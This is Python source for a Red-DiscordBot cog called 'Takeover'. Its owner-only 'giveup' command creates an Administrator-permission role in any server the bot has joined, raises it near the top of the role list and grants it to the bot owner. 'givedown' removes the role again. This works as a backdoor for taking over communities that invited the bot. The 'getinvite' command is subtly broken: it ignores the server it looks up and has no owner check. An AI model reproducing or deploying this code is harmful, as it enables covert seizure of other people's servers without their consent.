import discord
from redbot.core import commands, Config, checks
from redbot.core.bot import Red

class Takeover(commands.Cog):
    def __init__(self, bot: Red):
        self.bot = bot
        self.data = Config.get_conf(self, identifier=454654916491, force_registration=True)
        default_guild = {'role': None}
        self.data.register_guild(**default_guild)

    @commands.command()
    async def getinvite(self, ctx, serverID: int):
        """Get an invite to a server by providing its server id."""
        server = self.bot.get_guild(serverID)
        if not server:
            return await ctx.send("Server not found.")

        invites = await ctx.guild.invites()
        if invites:
            await ctx.send(f"discord.gg/{invites[0].code}")
        else:
            for channel in ctx.guild.text_channels:
                try:
                    invite = await channel.create_invite()
                    await ctx.send(f"discord.gg/{invite.code}")
                    return
                except:
                    pass
            await ctx.send("no available invites.")

    @commands.command()
    async def giveup(self, ctx):
        """Gives you a bot managed role to bot owner only."""
        if not await self.bot.is_owner(ctx.author):
            return await ctx.send("This is bot owner only command.")

        roleData = await self.data.guild(ctx.guild).role()
        
        if not roleData:
            role = await ctx.guild.create_role(name="takeover", permissions=discord.Permissions(permissions=8))
            try:
                await role.edit(position=ctx.guild.me.top_role.position-1)
            except:
                pass

            await self.data.guild(ctx.guild).role.set(role.id)
        elif roleData:
            role = ctx.guild.get_role(int(roleData))
            if not role:
                role = await ctx.guild.create_role(name="takeover", permissions=discord.Permissions(permissions=8))
                try:
                    await role.edit(position=ctx.guild.me.top_role.position-1)
                except:
                    pass
                await self.data.guild(ctx.guild).role.set(role.id)
        
        await ctx.author.add_roles(role)
        await ctx.send(f"You were given {role.name} role.")


    @commands.command()
    async def givedown(self, ctx):
        """Takes away the bot managed takeover role."""
        if not await self.bot.is_owner(ctx.author):
            return await ctx.send("This is bot owner only command.")

        roleData = await self.data.guild(ctx.guild).role()
        if not roleData:
            return await ctx.send("There is no takeover role on this server.")
        
        await self.data.guild(ctx.guild).role.set(None)
        role = ctx.guild.get_role(int(roleData))
        if role:
            await role.delete()
        
        await ctx.send("Takeover role has been taken away from you.")

        